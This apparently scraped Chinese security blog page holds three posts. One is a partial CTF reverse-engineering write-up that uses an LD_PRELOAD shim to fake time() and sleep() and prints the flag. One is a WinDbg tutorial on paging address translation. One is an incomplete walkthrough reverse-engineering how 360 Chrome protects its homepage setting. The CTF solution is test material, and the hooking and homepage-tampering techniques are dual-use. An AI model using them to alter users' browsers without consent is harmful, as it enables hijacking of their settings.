<p>发现是需要 key 的，进一步分析在 print_funny_sleep 中 printf 和 sleep 影响了key的输出结果，patch 了这个函数，改为 nop<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">KEY: 1b 1b 24 f0 d9 d9 d9 d9 d9 25 25 25 04 b6 33 33 33 33 c5 fd 89 89 78 78 5a 88 88 ee ee eb 40 40 40 40 f6 0e</span><br><span class="line">OK YOU WIN. HERE&apos;S YOUR FLAG: r6OEBZiѾ</span><br><span class="line"> 4f1㌍#</span><br></pre></td></tr></table></figure></p>
<p>显然结果是不对的。patch printf 应该是没问题的，应该 sleep 出现了问题</p>
<h1><span id="3具体分析">3.具体分析</span></h1><p>结合国内的 writeup , patch 了 printf funny，然后 IDA F5，分析 C 流程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">qmemcpy(v22, &amp;unk_400A7E, sizeof(v22));	// read uinit flag</span><br><span class="line">v24 = __readfsqword(0x28u);</span><br><span class="line">v3 = v21;</span><br><span class="line">for ( i = 9LL; i; --i )&#123;</span><br><span class="line">    *(_DWORD *)v3 = 0;</span><br><span class="line">    v3 += 4;</span><br><span class="line">&#125; // init v21，v21 key_buf</span><br><span class="line">v19 = 201527; // 0x31337</span><br><span class="line">v20 = time(0LL);</span><br><span class="line">do&#123;</span><br><span class="line">    v11 = 0LL;</span><br><span class="line">    do&#123;</span><br><span class="line">        v5 = 0LL;</span><br><span class="line">        v6 = time(0LL);</span><br><span class="line">        srand(233811181 - v20 + v6); // init randmon seed</span><br><span class="line">        v7 = v21[v11];</span><br><span class="line">        v21[v11] = rand() ^ v7; // key_buf element xor</span><br><span class="line">        v8 = (&amp;funny)[v11];</span><br><span class="line">        while ( v5 &lt; strlen(v8) )&#123;</span><br><span class="line">            v9 = v8[v5];</span><br><span class="line">            if ( (_BYTE)v9 == 105 )&#123;</span><br><span class="line">                v23[(signed int)v5] = 105;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">            if ( (_DWORD)v5 &amp;&amp; v8[v5 - 1] != 32 )</span><br><span class="line">                v10 = __ctype_toupper_loc();</span><br><span class="line">            else</span><br><span class="line">                v10 = __ctype_tolower_loc();</span><br><span class="line">            v23[(signed int)v5] = (*v10)[v9];</span><br><span class="line">        &#125;</span><br><span class="line">        ++v5;</span><br><span class="line">        &#125;</span><br><span class="line">        v23[(signed int)v5] = 0;</span><br><span class="line">        ++v11;                                    // </span><br><span class="line">        // here is print funny,emm...but i patch it</span><br><span class="line">        sleep(1u);</span><br><span class="line">    &#125;while ( v11 != 36 );</span><br><span class="line">    --v19;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2><span id="31-程序流程详解">3.1 程序流程详解</span></h2><p>仔细分析程序流程，大致就是计算 key( 随机值与 0 xor 201527次)，然后 key 与 一段固定的值( uinit_flag ) xor 得到flag,输出flag，重点在计算 key 的三个嵌套循环中</p>
<ol>
<li>复制未初始化的 flag</li>
<li>栈保护 (Canary)</li>
<li>key_buf 清0</li>
<li>初始化大循环条件，v19 == 201527</li>
<li>大循环，循环条件，v19 &gt;= 0，也就是要循环201527次<ol>
<li>初始化中循环条件变量，v11 = 0</li>
<li>中循环，循环条件，v11 !=36,36 即 flag 的长度，也是 key 的长度<ol>
<li>通过时间差获取随机数种子</li>
<li>随机数 与 key_buf 数组中下标为 v11 的元素异或</li>
<li>小循环：格式化一行 funny</li>
</ol>
</li>
<li>输出一行 funny</li>
<li>sleep(1)</li>
</ol>
</li>
<li>输出 key</li>
<li>key xor uint_flag,输出flag</li>
</ol>
<p>算下来，整个大循环需要 201527 次，sleep(1)， 201527/60/60，也就是说至少要 55 个小时才能跑完这三个嵌套循环。</p>
<h2><span id="32-srandrand-机制">3.2 srand()/rand() 机制</span></h2><p>这里需要理解 srand()/rand() ，其要点就是随机数种子一致，生成的随机数是一致的。可通过以下代码验证：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">* file: rand_srand.cpp</span><br><span class="line">* author: asanzjx</span><br><span class="line">* rand srand test file</span><br><span class="line">* compiler: g++ rand_srand.cpp -o rand_srand</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">static int t = 0x31337;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int i = 0;</span><br><span class="line">    for(i;i&lt;10;i++)&#123;</span><br><span class="line">        srand(time(0));</span><br><span class="line">        sleep(1);</span><br><span class="line">        cout &lt;&lt; i &lt;&lt; &quot; random value:&quot; &lt;&lt; rand() &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // if the srand ret some value,the random value is some </span><br><span class="line">    for(i;i&gt;0;i--)&#123;</span><br><span class="line">        srand(t);</span><br><span class="line">        sleep(1);</span><br><span class="line">        cout &lt;&lt; i &lt;&lt; &quot; random value:&quot; &lt;&lt; rand() &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$./rand_srand</span><br><span class="line">0 random value:1498851891</span><br><span class="line">1 random value:125926385</span><br><span class="line">2 random value:1958051108</span><br><span class="line">3 random value:1663308015</span><br><span class="line">4 random value:1351789803</span><br><span class="line">5 random value:2121833688</span><br><span class="line">6 random value:753716439</span><br><span class="line">7 random value:1513028956</span><br><span class="line">8 random value:136593720</span><br><span class="line">9 random value:907047410</span><br><span class="line">10 random value:1427067673</span><br><span class="line">9 random value:1427067673</span><br><span class="line">8 random value:1427067673</span><br><span class="line">7 random value:1427067673</span><br><span class="line">6 random value:1427067673</span><br><span class="line">5 random value:1427067673</span><br><span class="line">4 random value:1427067673</span><br><span class="line">3 random value:1427067673</span><br><span class="line">2 random value:1427067673</span><br><span class="line">1 random value:1427067673</span><br></pre></td></tr></table></figure></p>
<p><strong>所以通过连续的时间差来确保程序每次运行时种子值序列是一致的，从而使程序每次运行的随机值序列一致，这样程序每次运行的 key 值是一致的，自然程序每次输出的 flag 值一致。</strong></p>
<h1><span id="4通过-ld_preload-注入-so-来加速时间">4.通过 LD_PRELOAD 注入 so 来加速时间</span></h1><p>如果按照正常执行这个程序，需要55个小时，这显然是不能忍的，所以要加快速度。方法就是改写 sleep()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">* file: anti_time.c</span><br><span class="line">* compiler: gcc --share anti_time.c -o anti_time.so</span><br><span class="line">* LD_PRELOAD=./anti_time.so ./hitb_bin100.elf</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">static int t = 0x31337;</span><br><span class="line"></span><br><span class="line">void sleep(int sec) &#123;</span><br><span class="line">	t += sec;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int time() &#123;</span><br><span class="line">	return t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>sleep() 不执行 sleep() 操作这个好理解，但为什么要返回 t+sec 以及 time() 函数返回 t 呢？这当然是和 key 的 xor 操作有关，保证时间差值序列一致。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$LD_PRELOAD=./anti_time.so ./hitb_bin100.elf</span><br><span class="line">KEY: 19 8f 67 74 c9 68 e6 0c 6f 54 1a 43 af 7b 5f b3 5c 01 98 58 68 56 1a 5e 31 0c 46 29 b8 a8 93 fc bf f9 70 5e</span><br><span class="line">OK YOU WIN. HERE&apos;S YOUR FLAG: p4ul_1z_d34d_1z_wh4t_th3_r3c0rd_s4ys</span><br></pre></td></tr></table></figure></p>
<h1><span id="5ld_preload-示例">5.LD_PRELOAD 示例</span></h1><p>LD_PRELOAD 是一种动态注入，在程序运行时加载。通过代码实际感受下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">* file: preload.c</span><br><span class="line">* author: asanzjx</span><br><span class="line">* compiler: gcc preload.c -o preload</span><br><span class="line">* LD_PRELOAD=./anti_time.so ./preload</span><br><span class="line">*/</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">	printf(&quot;[+]pid:%d&quot;,getpid());</span><br><span class="line">	while(1)&#123;</span><br><span class="line">		sleep(2);</span><br><span class="line">		printf(&quot;[+]time:0x%x&quot;,time(0));</span><br><span class="line">	&#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">* file: anti_time.c</span><br><span class="line">* author: asanzjx</span><br><span class="line">* compiler: gcc --share anti_time.c -o anti_time.so</span><br><span class="line">* LD_PRELOAD=./anti_time.so ./preload</span><br><span class="line">*/</span><br><span class="line">int time() &#123;</span><br><span class="line">	return t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>查看maps结果如下（部分省略）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$LD_PRELOAD=./anti_time.so ./preload</span><br><span class="line">[+]pid:124</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$cat /proc/124/maps</span><br><span class="line">7fa715450000-7fa7155e5000 r-xp 00000000 00:00 689225             /lib/x86_64-linux-gnu/libc-2.x.so</span><br><span class="line">7fa7155e5000-7fa7155ed000 ---p 00195000 00:00 689225             /lib/x86_64-linux-gnu/libc-2.x.so</span><br><span class="line"></span><br><span class="line">7fa7157f0000-7fa7157f1000 r-xp 00000000 00:00 714489             .../anti_time.so</span><br><span class="line">7fa7157f1000-7fa7157f2000 ---p 00001000 00:00 714489             .../anti_time.so</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>ldd 加载库如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ldd ./preload</span><br><span class="line">linux-vdso.so.1 (0x00007fffdf1d3000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4442830000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007f4442e00000)</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/05/06/3PagingModeVtoP/" itemprop="url">
                  三种分页模式(32bit,PAE,IA-32e)下的线性（虚拟）地址到物理地址的转换
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2018-05-06T16:30:00+08:00" content="2018-05-06">
              2018-05-06
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/kernel/" itemprop="url" rel="index">
                    <span itemprop="name">kernel</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
                &nbsp; | &nbsp;
                <a href="/2018/05/06/3PagingModeVtoP/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/05/06/3PagingModeVtoP/" itemprop="commentsCount"></span>
                </a>
              </span>
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>为了更好管理更大的内存，现代操作系统和CPU硬件引入了保护模式。其中保护模式的分页机制通过内存管理单元（MMU，Memory Management Unit）实现了物理地址到线性（虚拟）地址的转换，这个转换过程也称地址翻译。而本文探讨线性地址到物理地址的转换过程，并通过实际操作来体现。</p>
<p>实验环境：</p>
<ul>
<li>win 10</li>
<li>windbg Preview</li>
<li>VirtBox+win xp(切换PAE状态)</li>
</ul>
<p>实验环境主要涉及Windbg通过VirtBox实现内核双机调试和本地内核调试。</p>
<p>具体理论部分可参考Intel手册中关于<strong>Paging</strong>的章节：<a href="https://www.intel.com/content/www/us/en/architecture-and-technology/64-ia-32-architectures-software-developer-manual-325462.html" target="_blank" rel="external">https://www.intel.com/content/www/us/en/architecture-and-technology/64-ia-32-architectures-software-developer-manual-325462.html</a></p>
<h1><span id="涉及到的概念">涉及到的概念</span></h1><p>控制寄存器：</p>
<ul>
<li>cr0：分页机制的开关，PE位代表保护模式。PG位代表分页机制</li>
<li>cr3：分页数据结构的基地址，cr3中存储的物理地址与分页模式有关</li>
<li>cr4：控制硬件虚拟化设置(Pentium及80486以后才有)</li>
</ul>
<p><strong>PAE</strong>:Physical Address Extension,物理地址扩展。</p>
<p>查看系统是否开启了PAE（以xp为例），我的电脑-系统属性-常规：计算机;或者查看CR4寄存器的5位是否为1。</p>
<p>对于在长模式(long mode)中的x64来说，PAE是必须的。PAE改变了传统的保护模式分页机制，增加了一级页,CR3不再指向页目录物理段地址，而是指向页目录指针表，即一个包含4个页目录指针的表。</p>
<h1><span id="分页模式">分页模式</span></h1><p>启用分页模式条件：cr0.PG = 1 且 cr0.PE = 1</p>
<p>根据不同CPU架构及特性主要分为三种模式，处于哪种模式视寄存器属性不同：</p>
<ul>
<li>32-bit paging(32位OS): cr0.PG = 1 ; cr4.PAE = 0</li>
<li>PAE paging(32位OS且开启了PAE): cr0.PG = 1 ; cr4.PAE = 1 ; IA32_EFER.LME = 0</li>
<li>IA-32e paging(64位OS): cr0.PG = 1 ; cr4.PAE = 1 ; IA32_EFER.LME = 1</li>
</ul>
<p><strong>需要注意的是</strong>：</p>
<ol>
<li>32bit下，每个entry（表项）是4字节大小；而在PAE和IA-32e下，每个entry是8字节大小</li>
<li>在x64体系中只实现了48位的virtual address，高16位被用作符号扩展，这高16位要么全是0，要么全是1。所以在讨论64bit地址的时候，高16位不使用<h2><span id="paging相关数据结构">Paging相关数据结构</span></h2></li>
</ol>
<ul>
<li><strong>PML4T</strong>:The page map level 4 table,每个表为4kb,内含512个PML4E结构。这个表的物理基址存储在cr3[12:51]中(IA-32e特有)</li>
<li><strong>PML4E</strong>:The page map level 4 entry，PML4表项，每个8字节大小(IA-32e特有)</li>
<li><strong>PDPT</strong>：Page Directory Pointer Table，页目录指针表，每个表4kb,内含512分PDPTE结构(PAE和IA-32e特有，PAE下这个表的物理地址存储在cr3[5:31]中)</li>
<li><strong>PDPTE/PDPE</strong>：Page Directory Pointer Table Entry,页目录指针表项，每个8字节(PAE和IA-32e特有)</li>
<li><strong>PDT</strong>：Page Directory Table，每个表4K，内含512个PDE结构</li>
<li><strong>PDTE/PDE</strong>:Page Directory Table Entry,页目录表的表项</li>
<li><strong>PT</strong>：Page Table，每个4kb，内含512个PTE结构</li>
<li><strong>PTE</strong>：Page Table Entry</li>
</ul>
<p>这里需要注意的是各种table及entry的描述性数据结构，在实际操作中，其低12bit都置0处理，因为这部分是用来描述页表属性的。</p>
<h2><span id="地址转换基本原理">地址转换基本原理</span></h2><p>原理很简单，就是讲线性地址拆分，各个域对应不同表，表项的index，然后来一步步定位。随着32bit OS到64bit OS的转变，32bit地址到64位地址的转变，地址转换的层级也就逐步增多，从二级页表(32bit)到三级（PAE），再到4级（64bit）。</p>
<h2><span id="页转换模型">页转换模型</span></h2><p>IA-32e提供了三种页转换模型：</p>
<ul>
<li>4k：PML4t,PDPT,PDT和PT</li>
<li>2M：PML4T，PDPT和PDT</li>
<li>1G：PML4T和PDPT</li>
</ul>
<p>本文所有分页模式下的转换都是基于4K的寻址方式，因为在个人计算机上，普遍是4K，4K对齐嘛</p>
<h1><span id="32bit地址">32bit地址</span></h1><p>32bit的线性地址到物理地址转换最简单，是通过二级页表来进行的。此时cr3高20位中存储的是页目录表物理基地址</p>
<p>具体步骤：</p>
<ol>
<li>将32bit地址拆分为三部分：高10位（PDE index），中间10位（PTE index），低12位（物理页offset）</li>
<li>获取页表的物理基地址：PDE index <em> 4 + cr3中页目录表基地址= </em>PT base addr，通过这个指针即可找到页表的物理基地址</li>
<li>获取分配到的物理页地址：PTE index * 4 + PT base addr，就可以找到存储物理页地址的页表项</li>
<li>物理页地址+物理页offset=物理地址</li>
</ol>
<p>这里为什么乘以4呢，因为每个entry 4字节大小</p>
<p><img src="/images/3PagingModeVtoP/4K32NonPAE.PNG" alt="32bit No PAE"></p>
<p>以未开启PAE的win xp下calc.exe为例，其入口地址为0x1012475，这个地址怎么来的呢，OD载入即可找到。因为没有ASLR，所以每次运行的地址是固定的。将0x1012475分成三部分:</p>
<ul>
<li>0x10</li>
<li>0x12</li>
<li>0x475</li>
</ul>
<p><img src="/images/3PagingModeVtoP/va2ra2.PNG" alt="0x1012475入口特征"></p>
<p><img src="/images/3PagingModeVtoP/va2ra1.PNG" alt="32bit地址转换过程"><br>根据上面两张图，可以看出物理地址0x145e8375处数据和0x1012475处数据一致</p>
<p>为了进一步验证是否数据是否一致，在Windbg下修改物理地址处数据，然后通过OD查看虚拟地址处的数据，发现也是一致变化的。<br><img src="/images/3PagingModeVtoP/va2ra3.PNG" alt="Windbg修改数据"></p>
<h1><span id="开启pae">开启PAE</span></h1><p>此时线性地址要拆分成四部分，高2位（PD index），中高9位（PT index）,中的（PTE index）,低12位（物理页偏移）。此时cr3[5:31]存储的是PDPT base addr。<br><img src="/images/3PagingModeVtoP/PDPTbase.PNG" alt="cr3 PDPT base"></p>
<p>开启硬件的PAE选项，可以发现XP下多了”物理地址扩展”<br><img src="/images/3PagingModeVtoP/va2ra4.PNG" alt="开启PAE"></p>
<p>将0x1012475拆分成四部分：</p>
<ul>
<li>0x0</li>
<li>0x8</li>
<li>0x12</li>
<li>0x475</li>
</ul>
<p>具体转换步骤如下图：<br><img src="/images/3PagingModeVtoP/va2ra5.PNG" alt="PAE下地址转换过程"><br>这里为什么乘以8呢，因为PAE下每个entry 8字节大小</p>
<h1><span id="ia-32e地址转换">IA-32e地址转换</span></h1><p>此时64bit线性地址要拆分成五部分：</p>
<ul>
<li>[51:42] (PML4E index)</li>
<li>[41:32]（PDPE index）</li>
<li>[31:22]（PDE index）</li>
<li>[21:13]（PTE index）</li>
<li>[12:0]（physical offset）</li>
</ul>
<p>此时cr3[5:31]存储的是PML4T base addr。<br><img src="/images/3PagingModeVtoP/PML4TBASE.PNG" alt="cr3 PML4T base"></p>
<p>用以下这张图可以清晰明了表示：<br><img src="/images/3PagingModeVtoP/1G2M4Kpage.PNG" alt="1G2M4Kpage"></p>
<p>这里测试写了一段代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;cstdio&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	char szName[20] = &quot;HelloWorld&quot;;</span><br><span class="line">	printf(&quot;szName:0x%x\n&quot;, szName);</span><br><span class="line">	cout &lt;&lt; &quot;szName:&quot; &lt;&lt; &amp;szName &lt;&lt; endl;</span><br><span class="line">	getchar();</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>为什么这里要写个printf输出呢。因为在看雪论坛上看到一个帖子啊，讲x64位虚拟地址转换，用printf直接输出值，这样是不严谨的，因为printf直接输出的话，只能输出32bit地址，如果是64bit的话，高32bit会被截取掉的。看雪上那篇帖子测试的时候正好输出了32bit的地址，所以可以寻到物理地址。</p>
<p>这里将szName的地址：0x2f440ff628分成五部分：</p>
<ul>
<li>0x0</li>
<li>0xbd</li>
<li>0x20</li>
<li>0xff</li>
<li>0x628</li>
</ul>
<p>具体转换步骤如下图：<br><img src="/images/3PagingModeVtoP/va2ra7.PNG" alt="IA-32e地址转换"><br>同样这里乘以8也是因为每个entry 8字节大小 </p>
<p>Windbg有一个扩展指令，!vtop可将虚拟地址转换成物理地址，在上图中也有验证。</p>
<h1><span id="参考链接">参考链接</span></h1><p>启用PAE后虚拟地址到物理地址的转换：<a href="https://bbs.pediy.com/thread-180989.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-180989.htm</a></p>
<p>X64下的虚拟地址到物理地址的转换：<a href="https://bbs.pediy.com/thread-203391.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-203391.htm</a></p>
<p>理解 paging：<a href="http://www.mouseos.com/arch/paging.html" target="_blank" rel="external">http://www.mouseos.com/arch/paging.html</a></p>
<p><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/converting-virtual-addresses-to-physical-addresses" target="_blank" rel="external">https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/converting-virtual-addresses-to-physical-addresses</a></p>
<p><a href="https://www.intel.com/content/www/us/en/architecture-and-technology/64-ia-32-architectures-software-developer-manual-325462.html" target="_blank" rel="external">https://www.intel.com/content/www/us/en/architecture-and-technology/64-ia-32-architectures-software-developer-manual-325462.html</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/03/21/360Chrome/" itemprop="url">
                  记录一次逆向360极速浏览器修改主页设置
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2017-03-21T22:29:00+08:00" content="2017-03-21">
              2017-03-21
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/逆向/" itemprop="url" rel="index">
                    <span itemprop="name">逆向</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
                &nbsp; | &nbsp;
                <a href="/2017/03/21/360Chrome/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/03/21/360Chrome/" itemprop="commentsCount"></span>
                </a>
              </span>
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>看到FreeBUF上有一篇文章逆向360极速浏览器和360首页设置加密算法，<a href="http://www.freebuf.com/articles/terminal/128902.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/128902.html</a>。当时对这个很感兴趣，想尝试一下。这里在WindowsXP下以360极速浏览器8.5.0.144为例进行分析。</p>
<h2><span id="从文章中可以获取的信息">从文章中可以获取的信息</span></h2><p>按照文章所说，其设置流程为(这里把要设置的主页记作url)：</p>
<ol>
<li><p>计算硬件的机器码的MD5值，此处记为MD5-1</p>
</li>
<li><p>将MD5-1与url进行拼接，后计算MD5值，记为MD5-2</p>
</li>
<li><p>计算网卡的机器码的MD5值，记为MD-3</p>
</li>
<li><p>将MD5-1,MD-2与url拼接，计算base64</p>
</li>
</ol>
<p>然后文章中还可以了解的信息是360极速浏览器设置主页的注册表目录为：software\360chrme\homepage。然后在几个作者发的OD图中可以发现调用了chrome。</p>
<h2><span id="找到入口线索">找到入口线索</span></h2><p>首先看看chrome是个什么程序。在安装目录中%360Chrome\Chrome\Application\8.7.0.306%中可以发现找到chrome.dll文件，由此可以推断出主程序调用了这个DLL文件。</p>
<p>还有一个入口线索，上文可知360极速浏览器设置主页的注册表目录，用string或者OD载入360chrome主程序都无法找到这个注册表目录的字符串。而在chrome.dll是可以找到的。</p>
<p>既然已经查到了字符串是在chrome.dll文件中出现，那就找到运行这个DLL的入口吧。OD载入360chrome.exe主程序，选项-调试选项-事件中勾选中断在新模块(DLL)。F9运行，观察上下文，看是否为chrome.dll程序。OK，程序停在0x1c51161处，这里就是chrome.dll的领空啦。</p>
<p>取消勾选中断在新模块(DLL)。F8跟踪到第一个返回，然后Alt+F9返回用户代码领空。程序停在了0x417dea地址处。F8继续跟踪可以然后接一个返回直接到了0x4180fa地址处。经过多次分析和跑飞，发现正常的流程应该是跳到0x418ad1处挂断点跑程序，完成对chrome.dll的加载，</p>
<h2><span id="进入chromedll">进入chrome.dll</span></h2><p>F7进入。这样就来到了0x1c597c4地址处。搜索字符串“Software\360Chrome\Homepage，可以发现在0x1de48df;0x1de48f2;0x1d2e51f地址处有push<br>chrome.03821320指令，而 chrome.03821320存放的就是要搜索的字符串。</p>
<h3><span id="前两个指令">前两个指令</span></h3><p>Ctrl+G跳转到0x1de48df地址处，0x1de48eb地址处下断点</p>
<p>在第四个call下断点，运行然后进入。来到了地址0x1de4984地址处。</p>
<p>在0x1de498b0地址处call了一个打开注册表的函数，这个函数正是打开Homepage\Default这个目录。参数详见栈空间。</p>
<p>上面的分析没找到什么有关于加密的算法实现。</p>
<h3><span id="0x1d2e51f">0x1d2e51f</span></h3><p>这样就剩下最后的0x1d2e51f出的地址，挂断点跑程序。</p>
<p>首先进入第一个call函数分析，0x1d2e52a。</p>
<p>0x627ee28存放的是360极速浏览器用户数据目录。</p>
